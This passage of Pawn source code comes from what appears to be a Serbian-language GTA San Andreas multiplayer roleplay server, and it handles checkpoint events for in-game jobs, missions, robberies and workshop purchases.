            BussinesJobMoney(POSAO_PILOT, PlataPosla[PLATA_PILOT]/2);

            SavePlayer( playerid );
            SendJobMessage( playerid, "Zaradili ste "col_white"%d$ "col_job"koji su vam legli na platni racun.", PlataPosla[PLATA_PILOT]);

            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            UzeoOpremu[ playerid ] = false;

            return 1;
        }

        return 1;
    }

    if(prevoziDrva[playerid] >= 1) {

        if(prevoziDrva[playerid] == 1) {

            Novi_DestroyVehicle(posaoDrvaVozilo[playerid]);
            posaoDrvaVozilo[playerid] = V01D_CreateVehicle(578, 1090.5057,-344.6219,74.6338,73.9300, 0, 0, -1 );
            Novi_PutPlayerInVehicle(playerid, posaoDrvaVozilo[playerid], 0);
            
            // posaoDrvaObjekat[playerid] = CreateDynamicObject(18609,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
            // AttachDynamicObjectToVehicle(posaoDrvaObjekat[playerid], posaoDrvaVozilo[playerid], 0.211, -4.615, 0.680, 0.000, 0.000, 5.799);

            Novi_DisablePlayerCheckpoint(playerid);
            Novi_SetPlayerCheckpoint(playerid, 840.9544,3400.8481,63.6965, 5.0);

            prevoziDrva[playerid] = 2;

            SendJobMessage(playerid, "Idi na mesto istovara u Lost City!");

            return 1;
        }

        if(prevoziDrva[playerid] == 2) {

            if(!IsPlayerInVehicle(playerid, posaoDrvaVozilo[playerid])) return SendErrorMessage(playerid, "Moras biti u svom vozilu za posao!");
            if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");

            TogglePlayerControllable(playerid, false);

            GameTextForPlayer(playerid, "~r~Istovar u toku..", 15000, 3);

            defer IstovarDrveca(playerid);

            Novi_DisablePlayerCheckpoint(playerid);

            return 1;
        }

        if(prevoziDrva[playerid] == 3) {

            if(!IsPlayerInVehicle(playerid, posaoDrvaVozilo[playerid])) return SendErrorMessage(playerid, "Moras biti u svom vozilu za posao!");
            if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");

            DisablePlayerCheckpoint(playerid);

            prevoziDrva[ playerid ] = 0;
            Novi_DestroyVehicle(posaoDrvaVozilo[playerid]);

            if(ServerInfo[HappyJob] == POSAO_DRVA) {
                dajPlatuIgracu(playerid, PlataPosla[PLATA_DRVA] * 2);
                SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
            } 
            else dajPlatuIgracu(playerid, PlataPosla[PLATA_DRVA]);

            BussinesJobMoney(POSAO_DRVA, PlataPosla[PLATA_DRVA]/2);

            SavePlayer( playerid );
            SendJobMessage( playerid, "Zaradili ste "col_white"%d$ "col_job"koji su vam legli na platni racun.", PlataPosla[PLATA_DRVA]);

            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            UzeoOpremu[ playerid ] = false;

            return 1;
        }

        return 1;
    }

    if(astronautCP[playerid] >= 1 && radiAstronaut[playerid]) {

        if(astronautCP[playerid] == 1) {

            DisablePlayerCheckpoint(playerid);
            astronautCP[playerid]++;

            Novi_SetPlayerCheckpoint(playerid, 1961.4723,1473.3123,1094.4314, 2.0);

            return 1;
        }
        if(astronautCP[playerid] == 2) {

            DisablePlayerCheckpoint(playerid);
            astronautCP[playerid]++;

            Novi_SetPlayerCheckpoint(playerid, 1880.2297,1469.2404,1094.7405, 2.0);

            SendJobMessage(playerid, "Sada idi u kabinu da zapocnes popravku svemirskog broda!");

            return 1;
        }

        if(astronautCP[playerid] == 3) {

            DisablePlayerCheckpoint(playerid);
            astronautCP[playerid]++;

            TogglePlayerControllable(playerid, false);

            Novi_SetPlayerPos(playerid, 1876.7944,1471.1228,1088.1255);
            SetPlayerFacingAngle(playerid, 251.3467);

            SetPlayerCameraPos(playerid, 1879.218261, 1466.608032, 1087.900634);
            SetPlayerCameraLookAt(playerid, 1876.358276, 1470.703735, 1087.685668, CAMERA_CUT);

            astronautTDShow(playerid, true);

            // GameTextForPlayer(playerid, "~r~Popravka u toku..", 15000, 3);
            // ApplyAnimation( playerid, "BOMBER", "Plant_Loop", 4.0, 0, 0, 0, 15000, 0 );

            // defer astronautPopravkaTimer(playerid);

            return 1;
        }
        if(astronautCP[playerid] == 4) {

            radiAstronaut[playerid] = false;
            astronautCP[playerid] = 0;

            if(astronautTDShowed[playerid]) 
                astronautTDShow(playerid, false);
            astronautKey[playerid] = 0;
            astronautPopravkaBroj[playerid] = 0;

            Novi_DisablePlayerCheckpoint(playerid);

            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            UzeoOpremu[ playerid ] = false;

            if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_HEAD ) ) RemovePlayerAttachedObject( playerid, OBJECT_SLOT_HEAD );

            SetPlayerTime( playerid, ServerInfo[ VremeInGame ], 0 );
            SetPlayerWeather( playerid, 6 );

            PortajIgraca(playerid, 208.0606,1740.7100,17.6025);

            //PLATA_ASTRONAUT

            if(ServerInfo[HappyJob] == POSAO_ASTRONAUT) {
                dajPlatuIgracu(playerid, PlataPosla[PLATA_ASTRONAUT] * 2);
                SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
            } 
            else dajPlatuIgracu(playerid, PlataPosla[PLATA_ASTRONAUT]);

            BussinesJobMoney(POSAO_ASTRONAUT, PlataPosla[PLATA_ASTRONAUT]/2);

            SavePlayer( playerid );
            SendJobMessage( playerid, "Zaradili ste "col_white"%d$ "col_job"koji su vam legli na platni racun.", PlataPosla[PLATA_ASTRONAUT]);

            return 1;
        }
        return 1;
    }

    if(MolerCP[playerid] >= 1 && RadiMoler[playerid]) {

        DisablePlayerCheckpoint(playerid);

        TogglePlayerControllable(playerid, false);
        GameTextForPlayer(playerid, "~r~Farbas, pricekaj..", 4000, 3);
        ApplyAnimation(playerid, "GHETTO_DB", "GDB_Car_SMO", 4.0, 1, 1, 1, 0, 0, 0);

        defer FarbanjeTimerrr(playerid);

        return 1;
    }

    if(KrenuoKosenje[playerid]) {

        if(PokosenaTrava[playerid] == 1) { 
            Novi_SetPlayerCheckpoint(playerid, 1918.3177,-1222.1019,19.0708, 3.0);
            new Float:Pos[3]; GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
            Novi_DestroyVehicle(kosacVozilo[playerid]);
            kosacVozilo[playerid] = V01D_CreateVehicle(572, Pos[0], Pos[1], Pos[2], 180.0000, 0, 0, -1 );
            Novi_PutPlayerInVehicle(playerid, kosacVozilo[playerid], 0);

            PokosenaTrava[playerid]++;

            return 1;
        }

        if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(GetPlayerVehicleID(playerid)) == 572) {

            if(PokosenaTrava[playerid] < 16) {

                DisablePlayerCheckpoint(playerid);

                if(PokosenaTrava[playerid] == 2) { Novi_SetPlayerCheckpoint(playerid, 1887.5992,-1243.6619,13.8818, 3.0); }
                else if(PokosenaTrava[playerid] == 3) { Novi_SetPlayerCheckpoint(playerid, 1866.9052,-1229.8951,16.3786, 3.0); }
                else if(PokosenaTrava[playerid] == 4) { Novi_SetPlayerCheckpoint(playerid, 1881.9175,-1182.2511,22.9275, 3.0); }
                else if(PokosenaTrava[playerid] == 5) { Novi_SetPlayerCheckpoint(playerid, 1911.1311,-1162.2505,23.2548, 3.0); }
                else if(PokosenaTrava[playerid] == 6) { Novi_SetPlayerCheckpoint(playerid, 1941.7834,-1178.9161,19.7062, 3.0); }
                else if(PokosenaTrava[playerid] == 7) { Novi_SetPlayerCheckpoint(playerid, 1969.7847,-1157.0936,20.5424, 3.0); }
                else if(PokosenaTrava[playerid] == 8) { Novi_SetPlayerCheckpoint(playerid, 2020.6199,-1155.0009,22.2305, 3.0); }
                else if(PokosenaTrava[playerid] == 9) { Novi_SetPlayerCheckpoint(playerid, 2052.1716,-1168.3589,23.1294, 3.0); }
                else if(PokosenaTrava[playerid] == 10) { Novi_SetPlayerCheckpoint(playerid, 2020.1720,-1194.7675,20.2229, 3.0); }
                else if(PokosenaTrava[playerid] == 11) { Novi_SetPlayerCheckpoint(playerid, 2046.7896,-1222.5460,22.8242, 3.0); }
                else if(PokosenaTrava[playerid] == 12) { Novi_SetPlayerCheckpoint(playerid, 2030.8710,-1243.5125,22.6975, 3.0); }
                else if(PokosenaTrava[playerid] == 13) { Novi_SetPlayerCheckpoint(playerid, 2005.7369,-1246.8210,22.3908, 3.0); }
                else if(PokosenaTrava[playerid] == 14) { Novi_SetPlayerCheckpoint(playerid, 1976.0793,-1234.4578,19.6269, 3.0); }
                else if(PokosenaTrava[playerid] == 15) { Novi_SetPlayerCheckpoint(playerid, 1947.6758,-1236.6366,18.7620, 3.0); }

                PokosenaTrava[playerid]++;
                return 1;
            }
            else {

                DisablePlayerCheckpoint(playerid);

                SCM(playerid, SVETLOPLAVA, "Pokosili ste svu travu.");
                PokosenaTrava[ playerid ] = 0;
                Novi_DestroyVehicle(kosacVozilo[playerid]);
                kosacVozilo[playerid] = -1;

                if(ServerInfo[HappyJob] == POSAO_KOSAC) {
                    dajPlatuIgracu(playerid, PlataPosla[PLATA_KOSAC] * 2);
                    SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
                } 
                else dajPlatuIgracu(playerid, PlataPosla[PLATA_KOSAC]);

                BussinesJobMoney(POSAO_KOSAC, PlataPosla[PLATA_KOSAC]/2);

                SavePlayer( playerid );
                SendJobMessage( playerid, "Zaradili ste "col_white"%d$ "col_job"koji su vam legli na platni racun.", PlataPosla[PLATA_KOSAC]);
                KrenuoKosenje[ playerid ] = false;

                return 1;
            }
        }
    }

    if(NosiBankaTorbu[playerid]) {

        if(ClanPolicije(playerid)) {

            DisablePlayerCheckpoint(playerid);
            NosiBankaTorbu[playerid] = false;
            RemovePlayerAttachedObject(playerid, OBJECT_SLOT_BADGE);

            SendClientMessageToAll(-1, ""SRVBOJA1SCM"====================================="col_white" [ VANDREDNE VESTI ] "SRVBOJA1SCM"=====================================");
            SendClientMessageToAll(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Obavestavamo gradjane da je policija uspesno sprecila pljacku "SRVBOJA1SCM"BANKE"col_white"!");
            SendClientMessageToAll(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Za svoje dobro delo, grad ih nagradjuje novcanom nagradom od "SRVBOJA1SCM"15.000$"col_white" svakom clanu Policije!");
            SendClientMessageToAll(-1, ""SRVBOJA1SCM"===============================================================================================================");

            foreach( Player, i ) {

                if( IsPlayerConnected( i ) ) {
                    
                    if(ClanPolicije(i) && !isPlayerAFK(i)) {
                        DajIgracuNovac(i, 15000);
                        SendInfoMessage(i, "Za uspesno sprecavanje pljacke dobio si 15.000$!");
                    }
                }
            }
            return 1;
        }

        SendInfoMessage(playerid, "Uspesno si dosao do organizacije i ostavio %d$ u sef!", BankaRobPrice);
        new OrgID = PlayerInfo[playerid][xClan];

        OI[OrgID][oSafeMoney] += BankaRobPrice;
        SaveOrganization(OrgID);
        DisablePlayerCheckpoint(playerid);
        NosiBankaTorbu[playerid] = false;
        RemovePlayerAttachedObject(playerid, OBJECT_SLOT_BADGE);

        SendClientMessageToAll(-1, ""SRVBOJA1SCM"====================================="col_white" [ VANDREDNE VESTI ] "SRVBOJA1SCM"=====================================");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Obavestavamo gradjane da policija nije uspela da spreci pljacku "SRVBOJA1SCM"BANKE"col_white"!");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"===============================================================================================================");

        foreach( Player, i ) {

            if( IsPlayerConnected( i ) && PlayerInfo[i][xImaBRacun] ) {
                
                PlayerInfo[i][xBRacun] -= 1000;
            }
        }

        SendClientMessageToAll(0xFF0000FF, "(BANKA ROB) {FFFFFF}Zbog pljacke banke svaki igrac je izgubio 1000$!");
        return 1;
    }

    if(radiVojnik2[playerid]) {

        switch(vojnik2CP[playerid]) {

            case 1: {

                Novi_DisablePlayerCheckpoint(playerid);
                TogglePlayerControllable(playerid, 0);
                SetPlayerPos(playerid, 405.2985,2532.0012,16.5586);
                SetPlayerFacingAngle(playerid, 307.2677);
                SetPlayerCameraPos(playerid, 405.319732, 2528.243164, 18.240760);
                SetPlayerCameraLookAt(playerid, 406.39265, 2532.907226, 16.792190, CAMERA_CUT);
                GeneralTimer2[playerid] = 7;
                
                defer GeneralPricaTimer2(playerid);

                return 1;
            }
            case 2: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, -172.2141,2212.8516,28.4137, 2.0);

                Novi_DestroyVehicle(vojnik2Veh[playerid]);
                vojnik2Veh[playerid] = V01D_CreateVehicle(469, 374.9060,2537.3120,16.5644, 180.0000, 0, 0, -1 );
                Novi_PutPlayerInVehicle(playerid, vojnik2Veh[playerid], 0);
                
                vojnik2CP[playerid] = 3;

                return 1;
            }

            case 3: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, -294.2575,2245.2153,62.6194, 2.0);

                Novi_DestroyVehicle(vojnik2Veh[playerid]);

                vojnik2CP[playerid] = 4;

                return 1;
            }

            case 4: {

                Novi_DisablePlayerCheckpoint(playerid);

                TogglePlayerControllable(playerid, 0);

                //Interpolacija
                InterpolateCameraPos(playerid, -287.426788, 2227.548828, 67.963569, -330.737304, 2214.483154, 47.427375, 6000);
                InterpolateCameraLookAt(playerid, -290.227935, 2231.230712, 66.066963, -334.573822, 2217.157226, 45.657962, 6000);

                defer vojnik2Camera(playerid, 1);

                return 1;
            }

            case 10: {

                Novi_DisablePlayerCheckpoint(playerid);

                Novi_SetPlayerCheckpoint(playerid, -713.1015,2443.1902,125.8404, 4.0);

                vojnik2CP[playerid] = 11;

                return 1;
            }
            case 11: {

                Novi_DisablePlayerCheckpoint(playerid);

                vojnik2CP[playerid] = 12;

                VojnikMessage(playerid, "Ubij cuvare kod tornja!");

                return 1;
            }
            case 14: {

                Novi_DisablePlayerCheckpoint(playerid);

                //Interpolacija i eksplozija
                defer vojnik2Eksplozija(playerid);

                TogglePlayerControllable(playerid, 0);

                InterpolateCameraPos(playerid, -651.686767, 2319.565917, 138.473464, -687.619323, 2296.483886, 174.771392, 4000);
                InterpolateCameraLookAt(playerid, -648.559997, 2319.837646, 134.581237, -683.289672, 2298.680664, 173.576049, 4000);

                vojnik2CP[playerid] = 15;

                return 1;
            }

            case 15: {

                Novi_DisablePlayerCheckpoint(playerid);

                Novi_SetPlayerCheckpoint(playerid, 405.3439,2532.0742,16.5579, 2.0);

                vojnik2CP[playerid] = 16;

                PortajIgraca(playerid, 396.6353,2530.7153,16.5440);

                return 1;
            }

            case 16: {

                VojnikMessage(playerid, "Uspesno si zavrsio misiju i zaradio %d koji su legli na platni racun!", PlataPosla[PLATA_VOJNIK]);
                Novi_DisablePlayerCheckpoint(playerid);
                ResetPlayerWeapons(playerid);
                Novi_SetPlayerArmour(playerid, 0);

                if(ServerInfo[HappyJob] == POSAO_VOJNIK) {
                    dajPlatuIgracu(playerid, PlataPosla[PLATA_VOJNIK] * 2);
                    SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
                }
                else dajPlatuIgracu(playerid, PlataPosla[PLATA_VOJNIK]);

                BussinesJobMoney(POSAO_VOJNIK, PlataPosla[PLATA_VOJNIK]/ 2);

                SavePlayer(playerid);

                Ubio1[playerid] = false;
                Ubio2[playerid] = false;
                vojnik2Obj[playerid] = -1;
                GeneralTimer2[playerid] = 0;
                radiVojnik2[playerid] = false;
                vojnik2CP[playerid] = 0;
                vojnik2Veh[playerid] = -1;

                UzeoOpremu[playerid] = false;
                PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );

                return 1;
            }
        }
    }

    if(GetPVarInt(playerid,"roped") == 1 && GetPlayerSkin(playerid) == skinid)
    {
        SetPVarInt(playerid,"roped",0);
        SetPVarInt(playerid,"chop_id",0);
        ClearAnimations(playerid);
        TogglePlayerControllable(playerid,0);
        TogglePlayerControllable(playerid,1);
        DisablePlayerCheckpoint(playerid);
        for(new destr4=0;destr4<=ropelength;destr4++)
        {
            DestroyDynamicObject(r0pes[playerid][destr4]);
        }
    }

    // if(PlayerRoute[playerid][Destination] != -1) {
    //     DisableGPS(playerid);
    // }

    if(playerHackingNosi[playerid]) {

        Novi_DisablePlayerCheckpoint(playerid);

        new zarada = PlataPosla[PLATA_HAKER] + RandomNew(500, 3000);

        if(ServerInfo[HappyJob] == POSAO_HAKER) {
            zarada *= 2;
            SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
        } 

        SendJobMessage(playerid, "Uspesno si zavrsio posao i zaradio %d$!", zarada);

        BussinesJobMoney(POSAO_HAKER, PlataPosla[PLATA_HAKER]/2);

        dajPlatuIgracu(playerid, zarada);
        SavePlayer(playerid);

        playerHackingNosi[playerid] = false;

        //deoniceNewPrice();

        return 1;
    }

    if(playerHacking[playerid] == 1) {

        Novi_DisablePlayerCheckpoint(playerid);

        TogglePlayerControllable(playerid, 0);

        HackingTDControl(playerid, 2);

        return 1;
    }

    if(misijaKradja[playerid] == 6) {

        Novi_DisablePlayerCheckpoint(playerid);

        radiMisiju[playerid] = 0;
        misijaKradja[playerid] = 0;

        ResetPlayerWeapons(playerid);

        missionPassed(playerid, 7000);

        return 1;
    }

    if(misijaKradja[playerid] == 1) {

        SendInfoMessage(playerid, "Ubij cuvare i ukradi laptop tipkom 'N'!");

        Novi_DisablePlayerCheckpoint(playerid);

        misijaKradja[playerid] = 2;

        return 1;
    }

    if(misijaUbistvo[playerid] == 3) {

        Novi_DisablePlayerCheckpoint(playerid);

        radiMisiju[playerid] = 0;
        misijaCounter[playerid] = 0;
        misijaUbistvo[playerid] = 0;

        missionPassed(playerid, 7000);

        return 1;
    }

    if(misijaUbistvo[playerid] == 1) {

        Novi_DisablePlayerCheckpoint(playerid);

        if(misijaCounter[playerid] >= 7) { 

            SendInfoMessage(playerid, "Nisi uspeo da stignes na vreme i policajac je otisao!");

            va_GameTextForPlayer(playerid, "~r~Mission Failed", 5000, 3);

            misijaCounter[playerid] = 0;
            misijaUbistvo[playerid] = 0;
            radiMisiju[playerid] = 0;

            return 1;
        }

        misijaUbistvo[playerid] = 2;
        SendInfoMessage(playerid, "Upucaj policajca kod kuce!");

        return 1;
    }

    if(misijaVraca[playerid]) {

        Novi_DisablePlayerCheckpoint(playerid);

        radiMisiju[playerid] = 0;
        misijaCounter[playerid] = 0;
        misijaVraca[playerid] = false;
        misijaNosi[playerid] = false;

        missionPassed(playerid, 3000);

        return 1;
    }

    if(misijaNosi[playerid]) {

        Novi_DisablePlayerCheckpoint(playerid);

        if(misijaCounter[playerid] >= 7) { //Smrt

            Novi_SetPlayerHealth(playerid, 0.0);

            SendInfoMessage(playerid, "Nisi uspeo da stignes na vreme i diler te je ubio!");

            va_GameTextForPlayer(playerid, "~r~Mission Failed", 5000, 3);

            misijaCounter[playerid] = 0;
            misijaNosi[playerid] = false;
            radiMisiju[playerid] = 0;

            return 1;
        }

        misijaVraca[playerid] = true;
        misijaNosi[playerid] = false;

        misijaCounter[playerid] = 0;

        Novi_SetPlayerCheckpoint(playerid, misijePosX, misijePosY, misijePosZ, 2.0);

        SendInfoMessage(playerid, "Vrati se kod sefa!");

        return 1;
    }

    if(NosiVozilo[playerid] > 0) {

        new id = PlayerInfo[playerid][xWorkShopGarage];

        Novi_DisablePlayerCheckpoint(playerid);

        Novi_DestroyVehicle(WorkShopVeh[playerid]);
        Novi_DestroyVehicle(WorkShopVehTow[playerid]);

        new bool:check = false;

        if(WorkShopInfo[id][wModel1] == 0) {

            WorkShopInfo[id][wModel1] = WorkShopBuyModel[playerid];
            check = true;
        }
        if(WorkShopInfo[id][wModel2] == 0 && !check) {

            WorkShopInfo[id][wModel2] = WorkShopBuyModel[playerid];
            check = true;
        }

        if(!check) {

            SendErrorMessage(playerid, "Nemas nijedan prazan slot!");
            DajIgracuNovac(playerid, WorkShopBuyPrice[playerid]);

            WorkShopBuyModel[playerid] = 0;
            WorkShopBuyPrice[playerid] = 0;
            KupioVozilo[playerid] = 1;
            NosiVozilo[playerid] = 0;

            SendInfoMessage(playerid, "Novac ti je vracen zbog neuspele kupovine!");

            return 1;
        }

        WorkShopInfo[id][wBrojAuta]++;

        SaveWorkShop(id);

        WorkShopVehicleCheck(id);

        WorkShopBuyModel[playerid] = 0;
        WorkShopBuyPrice[playerid] = 0;
        KupioVozilo[playerid] = 1;
        NosiVozilo[playerid] = 0;

        SendInfoMessage(playerid, "Uspesno si kupio novo vozilo u WorkShop!");

        return 1;
    }

    if(WorkShopBuyTow[playerid]) {

        WorkShopBuyTow[playerid] = false;

        Novi_DisablePlayerCheckpoint(playerid);

        Novi_SetPlayerCheckpoint(playerid, 2102.5356,-2084.4041,13.5469, 5.0);

        new Float:Poz[ 3 ];
        GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
        Novi_DestroyVehicle(WorkShopVehTow[playerid]);
        WorkShopVehTow[ playerid ] = V01D_CreateVehicle(525, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ], 0.0, 0, 0, -1 );
        Novi_PutPlayerInVehicle(playerid, WorkShopVehTow[playerid], 0);

        SendInfoMessage(playerid, "Idi po svoje vozilo!");

        return 1;
    }

    if(WorkShopBuyModel[playerid] > 0) {

        if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Moras biti u vozilu!");
        if(GetPlayerVehicleID(playerid) != WorkShopVehTow[playerid]) return SendErrorMessage(playerid, "Moras biti u svom Tow Truck vozilu!");
        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");

        Novi_DisablePlayerCheckpoint(playerid);

        new carID = WorkShopBuyModel[playerid];
        new carPrice = WorkShopBuyPrice[playerid];
        new id = PlayerInfo[playerid][xWorkShopGarage];

        if(GetPlayerMoney(playerid) < carPrice) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

        DajIgracuNovac(playerid, -carPrice);

        NosiVozilo[playerid] = 300;
        KupioVozilo[playerid] = 0;

        new Float:Poz[ 3 ];
        GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
        Novi_DestroyVehicle(WorkShopVeh[playerid]);
        WorkShopVeh[ playerid ] = V01D_CreateVehicle(carID, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ], 0.0, 0, 0, -1 );

        Novi_AttachTrailerToVehicle( WorkShopVeh[ playerid ], WorkShopVehTow[playerid]);

        // defer NosiVoziloTimer(playerid);

        Novi_SetPlayerCheckpoint(playerid, WorkShopInfo[id][wPosX], WorkShopInfo[id][wPosY], WorkShopInfo[id][wPosZ], 5.0);

        SendInfoMessage( playerid, "Vozilo ID: %d je stvoreno. Zakaci ga koristeci /tow !", WorkShopVeh[ playerid ] );

        return 1;
    }

    if(NosiFavella[playerid]) {

        SendInfoMessage(playerid, "Uspesno si dosao do organizacije i ostavio novac! U sef ste dobili %d$!", FavellaPrice);
        new OrgID = PlayerInfo[playerid][xClan];

        OI[OrgID][oSafeMoney] += FavellaPrice;
        SaveOrganization( OrgID );
        Novi_DisablePlayerCheckpoint(playerid);
        NosiFavella[playerid] = false;

        SendClientMessageToAll(0x0085C5FF, "(Favelle) : {FFFFFF}Organizacija koja je prodavala drogu je uspesno pobegla!");

        if(PlayerInfo[playerid][xAchivements][5] == 0) {

            achivementPassed(playerid, 5, 3000);
        }

        return 1;
    }

    if(NosiSliku[playerid]) {

        SendInfoMessage(playerid, "Uspesno si dosao do crnog trzista i ostavio sliku! U sef ste dobili %d$!", MuzejPrice);
        new OrgID = PlayerInfo[playerid][xClan];

        OI[OrgID][oSafeMoney] += MuzejPrice;
        SaveOrganization( OrgID );
        Novi_DisablePlayerCheckpoint(playerid);
        NosiSliku[playerid] = false;

        SendClientMessageToAll(-1, ""col_red"====================================="col_white" [ VANDREDNE VESTI ] "col_red"=====================================");
        SendClientMessageToAll(-1, ""col_red"REPORTER: "col_white"Kako doznajemo kriminalna grupa je pobegla izvan granica naseg grada te im se gubi svaki trag!");
        SendClientMessageToAll(-1, ""col_red"===============================================================================================================");

        UnistiLiftMuzej();
        UnistiSliku();
        MuzejPokrenut = false;
        LiftDole = false;
        OdnetaSlika = true;

        return 1;
    }

    if(NosiPaket[playerid]) {

        SendInfoMessage(playerid, "Uspesno si dosao do lokacije i dobio %d$ novca!", MafijaPaketPrice);

        Novi_DisablePlayerCheckpoint(playerid);
        NosiPaket[playerid] = false;

        new OrgID = PlayerInfo[playerid][xClan];

        OI[ OrgID ][ oSafeMoney ] += MafijaPaketPrice;
        SaveOrganization( OrgID );

        RemovePlayerAttachedObject(playerid, 8);

        StvorenPaket = false;

        return 1;
    }

	if(PosloviCP[playerid]) {

		SendInfoMessage(playerid, "Stigao si na odrediste!");
	    Novi_DisablePlayerCheckpoint(playerid);
		return 1;
	}

    if(DeliveryCP[playerid] == 1) {

        Novi_DisablePlayerCheckpoint(playerid);
        ShowPlayerDialog(playerid, dialog_DeliveryOdabir, DIALOG_STYLE_LIST, D_NASLOV, "Legalna Dostava\nIlegalna Dostava", "Potvrdi", " ");

        return 1;
    }

    if(DeliveryCP[playerid] == 2) { //Legalna

        if(!IsPlayerInVehicle(playerid, DeliveryVozilo[playerid])) return SendErrorMessage(playerid, "Moras biti u svom vozilu za posao!");
        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");

        Novi_DisablePlayerCheckpoint(playerid);
        Novi_SetPlayerCheckpoint(playerid, -71.5509,-1589.5165,2.6172, 5.0);

        DeliveryCP[playerid] = 3;

        SendInfoMessage(playerid, "Vrati se da bi dobio platu.");

        return 1;
    }

    if(DeliveryCP[playerid] == 3) { //Legalna Dosao

        if(!IsPlayerInVehicle(playerid, DeliveryVozilo[playerid])) return SendErrorMessage(playerid, "Moras biti u svom vozilu za posao!");
        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");

        Novi_DisablePlayerCheckpoint(playerid);

        Novi_DestroyVehicle(DeliveryVozilo[playerid]);
        DeliveryVozilo[playerid] = -1;
        DeliveryCP[playerid] = 0;
        RadiDelivery[playerid] = false;

        if(ServerInfo[HappyJob] == POSAO_DELIVERY) {
            dajPlatuIgracu(playerid, PlataPosla[PLATA_DELIVERY_LEGAL] * 2);
            SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
        } 
        else dajPlatuIgracu(playerid, PlataPosla[PLATA_DELIVERY_LEGAL]);

        SavePlayer(playerid);

        BussinesJobMoney(POSAO_DELIVERY, PlataPosla[PLATA_DELIVERY_LEGAL]/2);

        SendInfoMessage(playerid, "Zavrsio si posao i dobio $%d!", PlataPosla[PLATA_DELIVERY_LEGAL]);

        return 1;
    }

    if(DeliveryCP[playerid] == 4) { //Ilegalna

        if(!IsPlayerInVehicle(playerid, DeliveryVozilo[playerid])) return SendErrorMessage(playerid, "Moras biti u svom vozilu za posao!");
        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");

        Novi_DisablePlayerCheckpoint(playerid);
        Novi_SetPlayerCheckpoint(playerid, -71.5509,-1589.5165,2.6172, 5.0);

        DeliveryCP[playerid] = 5;
        SendInfoMessage(playerid, "Vrati se da bi dobio platu.");

        return 1;
    }

    if(DeliveryCP[playerid] == 5) { //Ilegalna Dosao

        if(!IsPlayerInVehicle(playerid, DeliveryVozilo[playerid])) return SendErrorMessage(playerid, "Moras biti u svom vozilu za posao!");
        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");

        Novi_DisablePlayerCheckpoint(playerid);

        Novi_DestroyVehicle(DeliveryVozilo[playerid]);
        DeliveryVozilo[playerid] = -1;
        DeliveryCP[playerid] = 0;
        RadiDelivery[playerid] = false;

        // PlayerInfo[playerid][xDeliveryBroj]++;

        // CheckJobSkill(playerid);

        new mats = 50;

        if(ServerInfo[HappyJob] == POSAO_DELIVERY) {
            mats *= 2;
            SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
        } 

        PlayerInfo[playerid][xMaterijali] += mats;
        SavePlayer(playerid);

        SendJobMessage(playerid, "Zavrsio si posao i dobio 50kg materijala!");

        return 1;
    }

    // if(MichaelMisija1CP3[playerid]) {

    //     SendInfoMessage(playerid, "Uspesno si zavrsio misiju i dobio 15.000$!");
    //     PlayAudioStreamForPlayer(playerid, "https://audio.jukehost.co.uk/ZG5GtMTBJYqOXGkiZUSnzFzpE0ZZaUs8", 0.0, 0.0, 0.0, 50.0, 0);
    //     GameTextForPlayer(playerid, "~p~Mission Passed~n~~w~+ 15.000$", 5000, 3);
    //     DajIgracuNovac(playerid, 15000);
    //     Novi_DisablePlayerCheckpoint(playerid);
    //     ResetPlayerWeapons(playerid);
    //     MichaelMisija1CP3[playerid] = false;
    //     PlayerInfo[playerid][xMichaelMisijaSpawn] = 1;
    //     return 1;
    // }

    // if(MichaelMisija1CP[playerid]) {

    //     Novi_DisablePlayerCheckpoint(playerid);
    //     MichaelMisija1CP[playerid] = false;
    //     ShowPlayerDialog(playerid, dialog_MichaelMisija1Prihvati, DIALOG_STYLE_MSGBOX, D_NASLOV, "Inspektor je preziveo! Ako hoces da dovrsis posao za\nsumu od 15.000$ samo reci", "Hocu", "Ti si lud");
    //     return 1;
    // }

    if(NosiZlataraTorbu[playerid]) {

        SendInfoMessage(playerid, "Uspesno si dosao do organizacije i ostavio %d$ u sef!", ZlataraRobPrice);
